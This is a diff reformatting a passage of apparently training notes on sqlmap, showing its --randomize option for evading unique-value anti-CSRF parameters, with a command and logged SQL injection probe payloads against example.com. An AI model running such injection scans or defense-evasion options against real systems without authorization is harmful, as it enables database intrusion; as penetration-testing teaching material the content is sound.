@@ -1694,8 +1694,16 @@ POST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap 
 
 In some cases, the web application may only require unique values to be provided inside predefined parameters. Such a mechanism is similar to the anti-CSRF technique described above, except that there is no need to parse the web page content. So, by simply ensuring that each request has a unique value for a predefined parameter, the web application can easily prevent CSRF attempts while at the same time averting some of the automation tools. For this, the option `--randomize` should be used, pointing to the parameter name containing a value which should be randomized before being sent:
 
-        shellsession
-`adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI URI: http://www.example.com:80/?id=1&rp=99954 URI: http://www.example.com:80/?id=1&rp=87216 URI: http://www.example.com:80/?id=9030&rp=36456 URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689 URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049 URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185`
+```shell
+adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
+
+URI: http://www.example.com:80/?id=1&rp=99954
+URI: http://www.example.com:80/?id=1&rp=87216
+URI: http://www.example.com:80/?id=9030&rp=36456
+URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689
+URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049
+URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185
+```
 <div align="center">
 <br>
 <br>
